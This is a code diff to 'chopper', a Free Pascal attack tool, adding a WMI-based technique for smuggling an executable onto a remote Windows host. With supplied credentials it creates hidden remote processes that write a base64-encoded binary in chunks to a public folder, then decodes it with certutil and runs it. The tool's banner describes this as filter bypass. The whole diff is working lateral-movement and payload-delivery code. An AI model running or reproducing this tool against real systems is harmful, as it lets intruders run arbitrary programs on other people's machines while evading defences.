@@ -6,8 +6,14 @@ uses
   {$IFDEF UNIX}{$IFDEF UseCThreads}
   cthreads,
   {$ENDIF}{$ENDIF}
-  Classes, SysUtils,jwawinsvc, windows,base64,CustApp
+  Classes, SysUtils,jwawinsvc, windows,base64,comobj,activex,variants,CustApp
   { you can add units after this };
+
+const
+ wbemFlagForwardOnly = $00000020;
+ HIDDEN_WINDOW       = 0;
+
+
 
 type
 
@@ -21,6 +27,7 @@ type
     destructor Destroy; override;
     procedure chop_chop; virtual;
     procedure chop_done; virtual;
+    procedure s_wmi;virtual;
     procedure usage; virtual;
   end;
 
@@ -31,7 +38,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('s t u p d f m', 'chop target username password domain filename chd');
+  ErrorMsg:=CheckOptions('s t u p d f m w', 'chop target username password domain filename chd wmi');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -50,16 +57,66 @@ begin
   chop_done;
   terminate;
   end;
+
+  if hasoption('w','wmi') then begin
+  s_wmi;
+  terminate;
+  end;
   usage;
   // stop program loop
   Terminate;
 end;
 
+
+
+procedure smuggle_wmi(username,password,host,chunk:OLEVariant);
+
+var
+  FSWbemLocator : OLEVariant;
+  FWMIService   : OLEVariant;
+  FWbemObjectSet: OLEVariant;
+  FWbemObject   : OLEVariant;
+  oEnum         : IEnumvariant;
+  iValue        : LongWord;
+  objProcess    : OLEVariant;
+  objConfig     : OLEVariant;
+  ProcessID     : Integer;
+  backdoor : OLEVariant;
+ // username,password,host: OLEVariant;
+  srvhost :string;
+  i:integer;
+  ssl_enabled : Boolean;
+begin;
+
+
+  FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');
+  FWMIService   := FSWbemLocator.ConnectServer(host, 'root\CIMV2', username, password);
+  FWbemObject   := FWMIService.Get('Win32_ProcessStartup');
+  objConfig     := FWbemObject.SpawnInstance_;
+
+  objConfig.ShowWindow := HIDDEN_WINDOW;
+  objProcess    := FWMIService.Get('Win32_Process');
+  objProcess.Create(chunk, null, objConfig, ProcessID);
+  Writeln(Format('Pid %d',[ProcessID]));
+  writeln('[+] task has been created successfully  ..!');
+
+end;
+
 procedure banner;
 begin
-writeln('winsvc.h smuggling binary via Service DisplayName');
-writeln('No Rate limitation Exploitation technique & filter bypass');
+writeln('-----------------------------------------------------------');
+writeln('#1 - Smuggling binary via Service DisplayName');
+writeln('#2 - Smuggling binary via WMI');
+writeln('Research : https://bit.ly/3ipnbDT');
 writeln('Author : Lawrence Amer @zux0x3a , https://0xsp.com');
+writeln('-----------------------------------------------------------');
+writeln('USAGE Technique #1: '+'chopper.exe -s -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
+writeln('USAGE Technique #2: '+'chopper.exe -m -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
+writeln('USAGE Technique #3: '+'chopper.exe -w -u DOMAIN\USERNAME -p PASSWORD -t MACHINE -f LOCALBINARYPATH');
+writeln('-----------------------------------------------------------');
+writeln('');
+
+
 end;
 
 function FileToBase64(const AFile: String; var Base64: String): Boolean;
@@ -263,6 +320,8 @@ var
    dwStat: DWORD;
    ServiceName,ServiceDisplayName,ServiceExecutable:Pchar;
 begin
+
+
   servicename := 'chopper';
   ServiceExecutable := pchar('c:\windows\system32\cmd.exe /c powershell -command "Get-Service "'+Pchar(servicename)+'" | select -Expand DisplayName |out-file -append tmp_payload.txt"');
    ServiceDisplayName := 'NODATA';
@@ -435,15 +494,58 @@ destructor Tchopper.Destroy;
 begin
   inherited Destroy;
 end;
+procedure Tchopper.s_wmi;
+var
+ username,password,host,res,process,filename:string;
+ i,p:integer;
+  len,numelem: integer;
+  arr : array of string;
+begin
 
+  banner;
+  writeln('Technique #3 - Smuggling via WMI');
+ for i := 1 to paramcount do begin
+  //check arg option
+  if (paramstr(i)='-t') then begin
+     host := paramstr(i+1);
+  end;
+    if (paramstr(i)='-u') then begin
+     username := paramstr(i+1);
+  end;
+      if (paramstr(i)='-p') then begin
+     password := paramstr(i+1);
+  end;
+    if (paramstr(i) ='-f') then begin
+     filename := paramstr(i+1);
+    end;
+    filetobase64(filename,res);
+
+
+// loop becomes here
+len := length(res);
+numelem := len div 150;
+
+if len mod 150 <>0 then
+inc(NumElem);
+setLength(arr,NumElem);
+
+for p := 0 to High(arr) do
+Arr[p] := copy(res,p * 150 + 1, 150);
+
+for p := 0 to High (arr) do begin
+
+process := 'c:\windows\system32\cmd.exe /c powershell.exe -command "'''+Arr[p]+''' |out-file -append c:\Users\Public\testman.txt"';
+writeln(process);
+smuggle_wmi(username,password,host,process);
+sleep(1);
+smuggle_wmi(username,password,host,'c:\windows\system32\cmd.exe /c certutil -decode -f c:\Users\Public\testman.txt c:\Users\Public\chopper.exe & c:\Users\Public\chopper.exe');
+
+end;
+end;
+  end;
 procedure Tchopper.usage;
 begin
-writeln('winsvc.h smuggling binary via Service DisplayName');
-writeln('No Rate limitation Exploitation technique & filter bypass');
-writeln('Author : Lawrence Amer @zux0x3a , https://0xsp.com');
-writeln('');
-writeln('USAGE Technique #1: '+'chopper.exe -s -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
-writeln('USAGE Technique #2: '+'chopper.exe -m -u USERNAME -p PASSWORD -d DOMAIN -t MACHINE -f LOCALBINARYPATH');
+banner;
 end;
 
 
